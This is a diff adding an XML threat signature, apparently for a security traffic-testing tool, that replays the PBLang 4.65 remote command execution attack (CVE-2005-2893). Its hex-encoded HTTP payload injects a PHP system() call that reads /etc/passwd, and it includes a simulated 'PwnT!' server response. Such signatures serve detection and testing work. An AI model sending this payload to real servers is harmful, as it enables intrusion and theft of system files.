@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="PBLang Remote Command Execution"/>
+    <EngDesc display="true" value="This threat sends a malformed GET request that causes the PBLang web application to issue remote commands on the target system.  PBLang is a web based forum application, and would typically listen on port 80."/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="PBLang"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="PBLang_PBLang"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="PBLang_PBLang_4.65"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/id.php?id=1202"/>
+    <CVEID display="true" value="CVE-2005-2893"/>
+    <bugtraqID display="true" value="14728"/>
+    <OSVDB display="true" value="19169"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010633eaf9c500c000a80001003c1718ca46"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200645156250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X50\X4F\X53\X54\X20\X68\X74\X74\X70\X3A\X2F\X2F\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X2F\X66\X6F\X72\X75\X6D\X2F\X75\X63\X70\X2E\X70\X68\X70\X3F\X69\X64\X3D\X32\X26\X75\X73\X65\X72\X3D\X75\X73\X65\X72\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0D\X0A\X48\X6F\X73\X74\X3A\X20\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X61\X70\X70\X6C\X69\X63\X61\X74\X69\X6F\X6E\X2F\X78\X2D\X77\X77\X77\X2D\X66\X6F\X72\X6D\X2D\X75\X72\X6C\X65\X6E\X63\X6F\X64\X65\X64\X0D\X0A\X55\X73\X65\X72\X2D\X41\X67\X65\X6E\X74\X3A\X20\X4D\X6F\X7A\X69\X6C\X6C\X61\X2F\X34\X2E\X30\X0D\X0A\X43\X6F\X6F\X6B\X69\X65\X3A\X20\X70\X62\X6C\X63\X6F\X6F\X6B\X69\X65\X37\X33\X32\X31\X32\X38\X3D\X50\X65\X6E\X67\X30\X3B\X20\X50\X42\X4C\X73\X65\X63\X69\X64\X3D\X61\X34\X63\X32\X66\X38\X34\X35\X63\X30\X30\X32\X61\X63\X35\X34\X66\X35\X37\X35\X31\X34\X34\X30\X36\X34\X37\X66\X33\X63\X39\X31\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X4C\X65\X6E\X67\X74\X68\X3A\X20\X33\X35\X39\X0D\X0A\X0D\X0A\X75\X73\X65\X72\X3D\X75\X73\X65\X72\X26\X70\X61\X73\X73\X3D\X70\X61\X73\X73\X26\X70\X61\X73\X73\X32\X3D\X70\X61\X73\X73\X26\X6F\X6C\X64\X70\X61\X73\X73\X3D\X70\X61\X73\X73\X26\X65\X6D\X3D\X63\X6F\X6F\X6C\X40\X68\X61\X63\X6B\X65\X72\X2E\X72\X75\X26\X65\X6D\X68\X69\X64\X65\X3D\X68\X69\X64\X65\X26\X72\X65\X61\X6C\X6E\X61\X6D\X65\X3D\X26\X61\X6C\X69\X61\X73\X3D\X75\X73\X65\X72\X26\X6D\X73\X6E\X3D\X26\X69\X63\X71\X3D\X26\X61\X69\X6D\X3D\X26\X79\X61\X68\X6F\X6F\X3D\X26\X71\X71\X3D\X26\X77\X65\X62\X3D\X68\X74\X74\X70\X25\X33\X41\X25\X32\X46\X25\X32\X46\X26\X6C\X6F\X63\X3D\X25\X32\X32\X25\X33\X42\X2B\X73\X79\X73\X74\X65\X6D\X25\X32\X38\X25\X32\X32\X65\X63\X68\X6F\X25\X32\X30\X25\X35\X46\X25\X34\X35\X25\X34\X45\X25\X35\X34\X25\X34\X35\X25\X35\X32\X25\X35\X46\X25\X33\X42\X25\X32\X30\X63\X61\X74\X20\X2F\X65\X74\X63\X2F\X70\X61\X73\X73\X77\X64\X0A\X25\X33\X42\X25\X32\X30\X25\X35\X46\X25\X35\X31\X25\X35\X35\X25\X34\X39\X25\X35\X34\X25\X35\X46\X25\X32\X32\X25\X32\X39\X25\X33\X42\X2B\X65\X63\X68\X6F\X2B\X25\X32\X32\X26\X70\X74\X3D"/>
+    <Created value="1139462366" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504F535420687474703A2F2F6578616D706C652E636F6D2F666F72756D2F7563702E7068703F69643D3226757365723D7573657220485454502F312E300D0A486F73743A206578616D706C652E636F6D0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A557365722D4167656E743A204D6F7A696C6C612F342E300D0A436F6F6B69653A2070626C636F6F6B69653733323132383D50656E67303B2050424C73656369643D61346332663834356330303261633534663537353134343036343766336339310D0A436F6E74656E742D4C656E6774683A203335390D0A0D0A757365723D7573657226706173733D706173732670617373323D70617373266F6C64706173733D7061737326656D3D636F6F6C406861636B65722E727526656D686964653D68696465267265616C6E616D653D26616C6961733D75736572266D736E3D266963713D2661696D3D267961686F6F3D2671713D267765623D68747470253341253246253246266C6F633D2532322533422B73797374656D2532382532326563686F253230253546253435253445253534253435253532253546253342253230636174202F6574632F7061737377640A2533422532302535462535312535352534392535342535462532322532392533422B6563686F2B2532322670743D7273742E6768632532312661763D6E6F6E652677656261763D267369673D26726567636F64653D31313235343238343836266C616E673D656E266163636570743D31265375626D69743D254345254632254546254630254530254532254538254632254643" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
